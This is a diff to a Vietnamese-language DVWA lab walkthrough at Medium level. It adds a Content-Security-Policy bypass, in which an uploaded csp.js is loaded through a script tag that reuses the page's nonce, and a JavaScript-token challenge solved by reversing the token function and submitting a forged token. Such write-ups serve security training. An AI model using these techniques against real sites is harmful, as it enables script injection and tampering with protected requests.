@@ -151,17 +151,44 @@ Chen **payload** vao o input **name**:
   
 ## 13. CSP Bypass
 **Payload**  
+Co the chay script tu cac nguon sau:  
 ```
-
+Content-Security-Policy
+	script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';
 ```
 **Result:**  
-
+Upload file **csp.js** bang chuc nang **File Upload**:  
+**csp.js**
+```  
+alert('CSP')
+```  
+He thong van cho phep chay script tren server voi gia tri **nonce** trung voi gia tri **nonce** trong **Content-Security-Policy**:  
+```  
+<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=" src="../../hackable/uploads/csp.js"></script>  
+```  
+![CSP Bypass_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/CSP%20Bypass_1.png)  
   
 ## 14. JavaScript
+Tuong tu nhu cap do Low, **token** duoc tao bang script sau:  
+```  
+function do_something(e) {
+    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
+    return t
+}
+setTimeout(function() {
+    do_elsesomething("XX")
+}, 300);
+
+function do_elsesomething(e) {
+    document.getElementById("token").value = do_something(e + document.getElementById("phrase").value + "XX")
+}
+```  
 **Payload**  
 ```
-
+token=XXsseccusXX&phrase=success&send=Submit
 ```
 **Result:**  
-
+  
+![JavaScript_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/JavaScript_1.png) 
+  
   
